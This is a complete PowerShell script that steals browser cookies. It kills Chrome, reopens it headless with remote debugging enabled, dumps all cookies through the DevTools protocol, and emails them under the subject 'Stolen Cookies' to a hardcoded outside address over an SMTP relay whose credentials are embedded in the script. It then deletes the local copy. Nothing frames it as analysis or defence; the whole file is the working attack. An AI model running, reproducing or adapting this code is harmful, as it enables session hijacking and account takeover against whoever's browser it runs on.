# Parameters
$toMail = "nielsvermeiren1@proton.me"
$remoteDebuggingPort = 9222

# Quit chrome function
function quitx(){
    if (Get-Process -Name "chrome" -ErrorAction SilentlyContinue) {
        Stop-Process -Name "chrome" -Force
    }
}

# Send websocket message to chrome and wait for response function
function SendReceiveWebSocketMessage {
    param (
        [string] $WebSocketUrl,
        [string] $Message
    )

    try {
        $WebSocket = [System.Net.WebSockets.ClientWebSocket]::new()
        $CancellationToken = [System.Threading.CancellationToken]::None
        $connectTask = $WebSocket.ConnectAsync([System.Uri] $WebSocketUrl, $CancellationToken)
        [void]$connectTask.Result
        if ($WebSocket.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
            throw "WebSocket connection failed. State: $($WebSocket.State)"
        }
        $messageBytes = [System.Text.Encoding]::UTF8.GetBytes($Message)
        $buffer = [System.ArraySegment[byte]]::new($messageBytes)
        $sendTask = $WebSocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $CancellationToken)
        [void]$sendTask.Result
        $receivedData = New-Object System.Collections.Generic.List[byte]
        $ReceiveBuffer = New-Object byte[] 4096 # Adjust the buffer size as needed
        $ReceiveBufferSegment = [System.ArraySegment[byte]]::new($ReceiveBuffer)

        while ($true) {
            $receiveResult = $WebSocket.ReceiveAsync($ReceiveBufferSegment, $CancellationToken)
            if ($receiveResult.Result.Count -gt 0) {
                $receivedData.AddRange([byte[]]($ReceiveBufferSegment.Array)[0..($receiveResult.Result.Count - 1)])
            }
            if ($receiveResult.Result.EndOfMessage) {
                break
            }
        }
        $ReceivedMessage = [System.Text.Encoding]::UTF8.GetString($receivedData.ToArray())
        $WebSocket.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "WebSocket closed", $CancellationToken)
        return $ReceivedMessage
    } catch {
        throw $_
    }
}

# Quit chrome and reopen it with remote debugging port
Write-Host "`nQuit current Chrome process if it exists.."
quitx
Write-Host "Open Chrome with remote debugging port.."
$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
Start-Process -FilePath $chromePath -ArgumentList "https://google.com", "--remote-debugging-port=$remoteDebuggingPort", "--remote-allow-origins=ws://localhost:$remoteDebuggingPort", "--headless" -PassThru

# Catch all browser cookies
$jsonUrl = "http://localhost:$remoteDebuggingPort/json"
$jsonData = Invoke-RestMethod -Uri $jsonUrl -Method Get
$url_capture = $jsonData.webSocketDebuggerUrl
$Message = '{"id": 1,"method":"Network.getAllCookies"}'

# Parse cookie data
Write-Host "`nObtain all cookies.."
$response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture[-1] -Message $Message


# Quit Chrome
Write-Host "Close Chrome.."
quitx

# Export the cookies to a .json file and remove first 14 header lines
Write-Host "`nWrite all cookies to temporary file.."
$outputFile = '.\Chrome-Cookies.json'
$response | Out-File -FilePath $outputFile
Write-Host "Remove heading so only cookies in json format remain.."
(Get-Content $outputFile | Select-Object -Skip 14) | Set-Content $outputFile
$cookies = Get-Content $outputFile -Raw
# Sending cookies to mail
Write-Host "Send cookies to mail:" $toMail
$cookies = Get-Content $outputFile -Raw 
$smtpKey = ConvertTo-SecureString "No9KqH4Yruua7jOP" -AsPlainText -Force
$smtpCredential = New-Object System.Management.Automation.PSCredential ("MS_F9KmrP@trial-pq3enl6wkzr42vwr.mlsender.net", $smtpKey)
Send-MailMessage -From "MS_F9KmrP@trial-pq3enl6wkzr42vwr.mlsender.net" -To $toMail -Subject "Stolen Cookies"  -SmtpServer "smtp.mailersend.net" -UseSsl -Credential $smtpCredential -body $cookies -Port 587 

# Success + cleaning
Write-Host "`n=> Mail successfuly sent!"
Remove-Item $outputFile
Write-Host "`nCleaning up.."